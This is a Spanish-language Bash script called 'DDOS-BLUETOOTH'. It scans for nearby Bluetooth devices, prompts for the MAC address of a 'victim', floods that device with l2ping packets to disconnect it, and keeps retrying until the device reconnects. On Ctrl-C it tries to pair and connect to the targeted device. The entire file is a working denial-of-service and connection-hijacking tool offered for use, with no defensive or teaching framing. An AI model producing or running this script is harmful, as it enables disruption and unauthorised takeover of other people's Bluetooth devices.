#!/bin/bash

rojo='\033[0;31m'
verde='\033[0;32m'
amarillo='\033[0;33m'
azul='\033[0;34m'



trap ctrl_c INT

function ctrl_c() {
    echo -e "\n\n${amarillo}[*]${verde} Vamos a intentar conectar el dispositivo ahora que está desautenticado...\n${azul}"
    echo -e "\n            [+] Emparejando con el Dispositivo"
    bluetoothctl pair $macAddress
    echo -e "\n            [+] Conectando con el Dispositivo"
    bluetoothctl connect $macAddress
    echo -e "\n            [+] INFORMACION SOBRE EL DISPOSITIVO"
    bluetoothctl info $macAddress
    echo -e "\n            [+] CONTINUAMOS ESCANEANDO LA RED..."
    bluetoothctl scan on
}

sudo clear
echo "            *****************************************************"
echo -e "            * @MklMillan     💣️     BIENVENIDO A DDOS-BLUETOOTH *"
echo "            *****************************************************"
sudo systemctl start bluetooth.service
loading_animation4() {
    local delay=0.1  # Delay entre cada paso
    local dots=("↷" "↻" "⥁")  # Caracteres para la animación

    # Definimos algunos colores
    local colors=( "\033[31m" "\033[32m" "\033[33m" "\033[34m" "\033[35m" "\033[36m" "\033[37m" "\033[0m" ) # Rojo, Verde, Amarillo, Azul, Magenta, Cian, Blanco, Reset
	
    echo -e "\n\n"
    while true; do
	  for dot in "${dots[@]}"; do
		# Elegir un color aleatorio
		local color=${colors[RANDOM % ${#colors[@]}]}
		
		echo -ne "\r${color}\t\t\t$dot $dot $dot $dot Buscando Redes... $dot $dot $dot $dot\033[0m"  
		sleep $delay
	  done
    done
}


	
	
	
Escaneo() {
    echo -e "\nReconocidos Anteriormente:"
    sudo bluetoothctl devices
    
   
    loading_animation4 &
    sudo hcitool scan > MACBLUETOOTH.txt
    sleep 4
    kill $!
    
    if [ -s MACBLUETOOTH.txt ]; then
    	echo -e "\nDispositivos Actuales:"
        echo -e "\n            [+] Copia la Dirección MAC de Tu Víctima ${amarillo}"
        cat MACBLUETOOTH.txt
        sleep 1
        wait
  	echo -e "\n"
        read -p "            [+] Introduce la Dirección MAC: " macAddress

        sudo clear

        echo -e "\n            [+] Enviando Paquetes de Auth... ${verde}"
        sudo l2ping $macAddress -t 0 -c 1000000 -s 44

        if [ $? -eq 1 ]; then
            echo -e "\n            [+] Dispositivo Víctima desconectado! ${rojo}"
            echo -e "\n            [+] Esperando a que el dispositivo se vuelva a conectar..."
            
            count=1
            
            while true; do
                sleep 2  # Espera 5 segundos antes de volver a comprobar
    
                echo -e "            Intento: [$count] "
                sudo l2ping $macAddress -t 0 -c 1000000 -s 44
                ((count++))
                
                
		sudo hcitool scan > MACBLUETOOTH.txt
		sleep 3
		
		verify=$(grep "$macAddress" MACBLUETOOTH.txt) 
		
                # Verifica si el dispositivo está conectado
                if [ "$verify" == "$macAddress" ]; then
                    echo -e "\n            [+] Dispositivo conectado nuevamente!"
                    break
                fi
            done

            # Una vez conectado, intenta enviar paquetes nuevamente
            sudo l2ping $macAddress -t 0 -c 1000000 -s 44

        fi
        
    else
        echo -e "\n            [+] No se encontraron Dispositivos ${rojo}"
        echo -e "\n            [+] Aparecerán dispositivos que tengan el Bluetooth activado pero que no están conectados a otros dispositivos"
        exit 1
    fi     
}

sudo rfkill unblock bluetooth
status=$(hciconfig hci0 | grep -o "UP")

if [ "$status" == "UP" ]; then
    echo -e "\n            [+] Interfaz de Bluetooth Lista... Espere por favor!!"
    Escaneo
else
    echo -e "\n            [+] Interfaz Bluetooth está DOWN"
    sleep 1
    echo -e "            [+] Intentando Levantar Interfaz Bluetooth... ${verde}"
    sleep 1
    echo -e "            [+] Encendiendo Bluetooth... ${verde}"
    sleep 1
    
    echo -e "            [+] Bluetooth Activado" 
    sleep 1
    echo -e "            [+] Probando Levantamiento de Interfaz Bluetooth... ${verde}"
    sleep 1
    
    sudo hciconfig hci0 up
    
    if [ $? -eq 0 ]; then
        echo -e "            [+] Interfaz levantada Satisfactoriamente ${amarillo}"
        sleep 1
        Escaneo			
    else 
        echo -e "${rojo}[+] Error al levantar la interfaz Bluetooth.${rojo}"
        exit 1 
    fi 
fi 
